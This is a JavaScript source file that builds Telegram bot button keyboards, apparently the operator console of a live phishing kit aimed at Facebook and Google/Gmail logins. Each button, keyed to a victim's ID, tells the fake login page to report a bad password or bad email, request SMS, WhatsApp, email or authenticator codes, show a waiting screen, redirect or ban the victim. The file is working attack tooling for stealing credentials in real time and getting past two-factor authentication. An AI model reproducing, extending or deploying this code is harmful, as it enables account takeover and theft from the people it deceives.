const GMAIL_COMMANDS = {
  badEmail: "g-bademail",
  badPass: "g-badpass",
  twoFaGmail: "g-2fagmail",
  twoFaCode: "g-2facode",
  twoFaYoutube: "g-2fayoutube",
  twoFaNumber: "g-2fanumber",
  twoFaSms: "g-2fasms",
  wrongTwoFaSms: "g-wrong2fasms",
  wrongTwoFaNumber: "g-wrong2fanumber",
  email2fa: "g-email2fa",
  wait: "g-wait",
  done: "g-done",
};

const LEGACY_GMAIL_COMMAND_ALIASES = {
  [GMAIL_COMMANDS.badEmail]: ["bademail", "badcreds"],
  [GMAIL_COMMANDS.badPass]: ["badpass"],
  [GMAIL_COMMANDS.twoFaGmail]: ["2fagmail"],
  [GMAIL_COMMANDS.twoFaCode]: ["2fanumber"],
  [GMAIL_COMMANDS.twoFaNumber]: [],
  [GMAIL_COMMANDS.twoFaSms]: ["2fasms"],
  [GMAIL_COMMANDS.wrongTwoFaSms]: [],
  [GMAIL_COMMANDS.wrongTwoFaNumber]: [],
  [GMAIL_COMMANDS.email2fa]: ["email2fa", "Email2fa"],
  [GMAIL_COMMANDS.wait]: ["gmailwait"],
  [GMAIL_COMMANDS.done]: ["done"],
};

const GMAIL_COMMAND_LOOKUP = Object.entries(LEGACY_GMAIL_COMMAND_ALIASES).reduce(
  (lookup, [canonicalName, aliases]) => {
    lookup[canonicalName] = canonicalName;
    aliases.forEach((alias) => {
      lookup[alias] = canonicalName;
    });
    return lookup;
  },
  {}
);

const buildCallbackData = (commandName, userId) => `/${commandName} ${userId}`;

const isCommandMatch = (callbackData, commandName) => {
  const aliases = [commandName, ...(LEGACY_GMAIL_COMMAND_ALIASES[commandName] || [])];
  return aliases.some((alias) => callbackData.startsWith(`/${alias} `));
};

const getCommandUserId = (callbackData) => callbackData.split(" ")[1];

const normalizeGmailCommand = (commandName) => GMAIL_COMMAND_LOOKUP[commandName] || commandName;

const buildGmailInlineKeyboard = (userId) => ({
  inline_keyboard: [
    [
      { text: "Bad Email", callback_data: buildCallbackData(GMAIL_COMMANDS.badEmail, userId) },
      { text: "Bad Pass", callback_data: buildCallbackData(GMAIL_COMMANDS.badPass, userId) },
    ],
    [
      { text: "2FA Gmail", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaGmail, userId) },
      { text: "2FA Code", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaCode, userId) },
      { text: "2FA SMS", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaSms, userId) },
      { text: "2FA Number", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaNumber, userId) },
    ],
    [
      { text: "W 2FA SMS", callback_data: buildCallbackData(GMAIL_COMMANDS.wrongTwoFaSms, userId) },
      { text: "Wrong 2FA Number", callback_data: buildCallbackData(GMAIL_COMMANDS.wrongTwoFaNumber, userId) },
    ],
    [
      { text: "Wait", callback_data: buildCallbackData(GMAIL_COMMANDS.wait, userId) },
      { text: "Done", callback_data: buildCallbackData(GMAIL_COMMANDS.done, userId) },
    ],
  ],
});

const buildUnifiedInlineKeyboard = (userId) => ({
  inline_keyboard: [
    [
      { text: "SMS 2FA", callback_data: `/2fa ${userId}` },
      { text: "Bad Pass", callback_data: `/password${Math.random().toString(36).substring(2, 15)} ${userId}` },
      { text: "Bad Creds", callback_data: `/badcreds${Math.random().toString(36).substring(2, 15)} ${userId}` },
      { text: "Approve", callback_data: `/phone ${userId}` },
    ],
    [
      { text: "WA 2FA", callback_data: `/whatsapp ${userId}` },
      { text: "Mail 2FA", callback_data: `/emailVerify ${userId}` },
      { text: "Email2fa", callback_data: `/Email2fa ${userId}` },
      { text: "App 2FA", callback_data: `/authApp ${userId}` },
      { text: "Google", callback_data: `/google ${userId}` },
    ],
    [
      { text: "Ban", callback_data: `/ban ${userId}` },
      { text: "Form", callback_data: `/email ${userId}` },
      { text: "Wait", callback_data: `/wait ${userId}` },
      { text: "N-Wait", callback_data: `/nwait ${userId}` },
    ],
    [
      { text: "Bad 2FA", callback_data: `/wrong2fa${Math.random().toString(36).substring(2, 15)} ${userId}` },
      { text: "Done", callback_data: `/done ${userId}` },
      { text: "Redirect", callback_data: `/redirect ${userId}` },
    ],
    [
      { text: "G Bad Email", callback_data: buildCallbackData(GMAIL_COMMANDS.badEmail, userId) },
      { text: "G Bad Pass", callback_data: buildCallbackData(GMAIL_COMMANDS.badPass, userId) },
      { text: "G 2FA Gmail", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaGmail, userId) },
      { text: "G 2FA Code", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaCode, userId) },
      { text: "G 2FA YouTube", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaYoutube, userId) },
    ],
    [
      { text: "G 2FA SMS", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaSms, userId) },
      { text: "G W 2FA SMS", callback_data: buildCallbackData(GMAIL_COMMANDS.wrongTwoFaSms, userId) },
      { text: "G 2FA Number", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaNumber, userId) },
      { text: "G W 2Fa Number", callback_data: buildCallbackData(GMAIL_COMMANDS.wrongTwoFaNumber, userId) },
    ],
    [
      { text: "G Wait", callback_data: buildCallbackData(GMAIL_COMMANDS.wait, userId) },
      { text: "G Done", callback_data: buildCallbackData(GMAIL_COMMANDS.done, userId) },
    ],
  ],
});

const buildFacebookKeyboard = (userId) => ({
  inline_keyboard: [
    [
      { text: "SMS 2FA", callback_data: `/2fa ${userId}` },
      { text: "Bad Pass", callback_data: `/password${Math.random().toString(36).substring(2, 15)} ${userId}` },
      { text: "Bad Creds", callback_data: `/badcreds${Math.random().toString(36).substring(2, 15)} ${userId}` },
      { text: "Approve", callback_data: `/phone ${userId}` },
    ],
    [
      { text: "WA 2FA", callback_data: `/whatsapp ${userId}` },
      { text: "Mail 2FA", callback_data: `/emailVerify ${userId}` },
      { text: "Email2fa", callback_data: `/Email2fa ${userId}` },
      { text: "App 2FA", callback_data: `/authApp ${userId}` },
    ],
    [
      { text: "Bad 2FA", callback_data: `/wrong2fa${Math.random().toString(36).substring(2, 15)} ${userId}` },
      { text: "N-Wait", callback_data: `/nwait ${userId}` },
      { text: "Form", callback_data: `/email ${userId}` },
      { text: "Google", callback_data: `/google ${userId}` },
    ],
    [
      { text: "Ban", callback_data: `/ban ${userId}` },
      { text: "Wait", callback_data: `/wait ${userId}` },
      { text: "Done", callback_data: `/done ${userId}` },
      { text: "Redirect", callback_data: `/redirect ${userId}` },
    ],
    [
      { text: "G", callback_data: `/switch-gm ${userId}` },
    ],
  ],
});

const buildGoogleKeyboard = (userId) => ({
  inline_keyboard: [
    [
      { text: "G Bad Email", callback_data: buildCallbackData(GMAIL_COMMANDS.badEmail, userId) },
      { text: "G Bad Pass", callback_data: buildCallbackData(GMAIL_COMMANDS.badPass, userId) },
    ],
    [
      { text: "G 2FA Gmail", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaGmail, userId) },
      { text: "G 2FA Code", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaCode, userId) },
      { text: "G 2FA YouTube", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaYoutube, userId) },
    ],
    [
      { text: "G 2FA SMS", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaSms, userId) },
      { text: "G 2FA Number", callback_data: buildCallbackData(GMAIL_COMMANDS.twoFaNumber, userId) },
    ],
    [
      { text: "G W 2FA SMS", callback_data: buildCallbackData(GMAIL_COMMANDS.wrongTwoFaSms, userId) },
      { text: "G W 2FA Number", callback_data: buildCallbackData(GMAIL_COMMANDS.wrongTwoFaNumber, userId) },
    ],
    [
      { text: "Ban", callback_data: `/ban ${userId}` },
      { text: "G Wait", callback_data: buildCallbackData(GMAIL_COMMANDS.wait, userId) },
      { text: "G Done", callback_data: buildCallbackData(GMAIL_COMMANDS.done, userId) },
      { text: "Redirect", callback_data: `/redirect ${userId}` },
    ],
    [
      { text: "F", callback_data: `/switch-fb ${userId}` },
    ],
  ],
});

export {
  GMAIL_COMMANDS,
  buildCallbackData,
  buildUnifiedInlineKeyboard,
  buildFacebookKeyboard,
  buildGoogleKeyboard,
  buildGmailInlineKeyboard,
  getCommandUserId,
  isCommandMatch,
  normalizeGmailCommand,
};
